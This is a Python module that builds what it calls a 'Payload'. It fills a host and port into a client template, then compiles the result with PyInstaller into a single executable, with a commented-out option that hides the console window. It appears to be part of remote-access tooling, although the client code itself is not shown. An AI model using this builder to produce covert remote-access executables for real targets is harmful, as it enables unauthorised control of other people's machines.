#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
This file is responsibel for creating the python and executabel Payload
'''

#TODO : Remove temporary workaround

__author__ = 'lorem.cookie'
__version__ = '0.1/alpha'

#Native Libs
import os

#Not native Libs
# import PyInstaller.__main__
from shutil import rmtree

#Temporary workaround
import subprocess

#Custome Exceptions
class FileOnlyModule(Exception):
    def __init__(self):
        Exception.__init__(self, 'FILE IS ONLY A MODULE')
        
class ErrorOpeningOutdir(Exception):
    def __init__(self):
        Exception.__init__(self,'ERROR OPENING OUTPUT DIR')
        
class ErrorOpeningSampleClientFile(Exception):
    def __init__(self):
        Exception.__init__(self,'ERROR READING SAMPLE_CLIENT')
        
class PyClientAlreadyExists(Exception):
    def __init__(self):
        Exception.__init__(self,'PyClient ALREADY EXISTS')
        
class ErrorWritingPyClient(Exception):
    def __init__(self):
        Exception.__init__(self,'ERROR WRITING TO PyClient')

def Build(HOST, PORT, OutputDir='OUT',SampleClient='SampleClient.txt' , Clean=False, Debug=False):
    
    SampleClient = os.path.join(os.getcwd(), 'build', SampleClient)
    OutputDir = os.path.join(os.getcwd(), OutputDir)
    PyClientName = 'client.py'
    PyClient = os.path.join(os.getcwd(), OutputDir, 'Py', PyClientName)
    PyDir = os.path.join(os.getcwd(), OutputDir, 'Py')

    if Clean:
        
        if Debug:
            
            print('[WARNING] Deleting {}'.format(OutputDir))
        
        rmtree(OutputDir)
    
    if Debug:
        
        print('[INFO] Check if {} exists'.format(OutputDir))
        
    if os.path.isdir(OutputDir):
        
        if Debug:
            
            print('[INFO] {} Does exist'.format(OutputDir))
            
    else:
        
        if Debug:
            
            print('[WARNING] {} Does not exist'.format(OutputDir))
            print('[INFO] Creating {}'.format(OutputDir))
            
        try:
            
            os.mkdir(OutputDir)
        
        except FileExistsError:
            
            if Debug:
                
                print('[ERROR] Error while creating {}'.format(OutputDir))
                print('[WARNING] Exiting Program')
                
            raise ErrorOpeningOutdir
        
    if Debug:
        
        print('[INFO] Check if {} exists'.format(PyDir))
        
    if os.path.isdir(PyDir):
        
        if Debug:
            
            print('[INFO] {} Does exist'.format(PyDir))
            
    else:
        
        if Debug:
            
            print('[WARNING] {} Does not exist'.format(PyDir))
            print('[INFO] Creating {}'.format(PyDir))
            
        try:
            
            os.mkdir(PyDir)
            
        except FileExistsError:
            
            if Debug:
                
                print('[ERROR] Error while creating {}'.format(PyDir))
                print('[WARNING] Exiting Program')
                
            raise ErrorOpeningOutdir
        
    try:
        
        with open(SampleClient, 'r') as f:
            
            sample_client_content = f.read().format(HOST=HOST, PORT=PORT)
    
    except (IOError, OSError):
        
        raise ErrorOpeningSampleClientFile
    
    if Debug:
        
        print('[INFO] Check if {} exists'.format(PyClient))
        
    if os.path.isfile(PyClient):
        
        if Debug:
            
            print('[ERROR] {} Already exists'.format(PyClient))
            
        raise PyClientAlreadyExists
    
    else:
        
        try:
            
            open(PyClient, 'w+').write(sample_client_content)
            
        except (IOError, OSError):
            
            raise ErrorWritingPyClient
        
    # TODO : Find stable solution
    
    # Temporary workaround
    # Temporary my ass
    subprocess.call('pyinstaller --onefile --distpath {OUT} --workpath {OUT} --specpath {OUT} --clean {PyClient}'.format(OUT=OutputDir, PyClient=PyClient))
        
    # FIXME : Doesnt write to output directory writes to Lorem-Py directory
    # FIXME : Unrecognized argument : PyClient
    
    # PyInstaller.__main__.run([
        # '--onefile', #Create a one-file bundled executable
        # '--distpath {}'.format(OutputDir),
        # '--workpath {}'.format(OutputDir),
        # '--specpath {}'.format(OutputDir),
        # '--noconsole', #Opens no console      #FIXME : Throws error when compiled for more information https://github.com/pyinstaller/pyinstaller/wiki/Recipe-subprocess
        # '--clean', #Removes all temporary files
        # PyClient,
    # ])
    
    if Debug:
        
        print('[INFO] Succesfully created and compiled Payload')

if __name__ == "__main__":
    raise FileOnlyModule